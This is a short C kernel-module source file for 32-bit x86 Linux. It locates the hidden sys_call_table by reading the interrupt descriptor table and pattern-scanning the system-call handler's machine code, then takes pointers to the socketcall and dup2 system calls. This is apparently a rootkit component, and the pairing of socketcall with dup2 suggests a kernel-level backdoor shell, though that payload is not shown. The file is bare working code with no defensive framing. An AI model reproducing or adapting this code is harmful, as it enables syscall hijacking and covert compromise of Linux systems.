#include <linux/syscalls.h>
#include <linux/unistd.h>

typedef asmlinkage long (*socketcall_t)(int call, unsigned long __user *args);
typedef asmlinkage long (*sys_dup2_t)(unsigned int oldfd, unsigned int newfd);


socketcall_t socketcall;
sys_dup2_t dup2;
unsigned long *sys_call_table = 0;

struct _idt
{
   unsigned short offset_low,segment_sel;
   unsigned char reserved,flags;
   unsigned short offset_high;
};

unsigned long *getscTable(void)
{
       unsigned char idtr[6],*shell,*sort;
       struct _idt *idt;
       unsigned long system_call,sct;
       unsigned short offset_low,offset_high;
       char *p;
       int i;

       __asm__("sidt %0" : "=m" (idtr));

       idt=(struct _idt*)(*(unsigned long*)&idtr[2]+8*0x80);
       offset_low = idt->offset_low;
       offset_high = idt->offset_high;
       system_call=(offset_high<<16)|offset_low;

       shell=(char *)system_call;
       sort="\xff\x14\x85";

       for(i=0;i<(100-2);i++)
            if(shell[i]==sort[0]&&shell[i+1]==sort[1]&&shell[i+2]==sort[2])
                     break;


       p=&shell[i];
       p+=3;
       sct=*(unsigned long*)p;

       return (unsigned long*)(sct);
}
int sctable_init(void)
{
	sys_call_table = getscTable();
	if(!sys_call_table)
		return -1;
	socketcall = (socketcall_t) sys_call_table[__NR_socketcall];
	dup2 = (sys_dup2_t) sys_call_table[__NR_dup2];
	return 0;
}
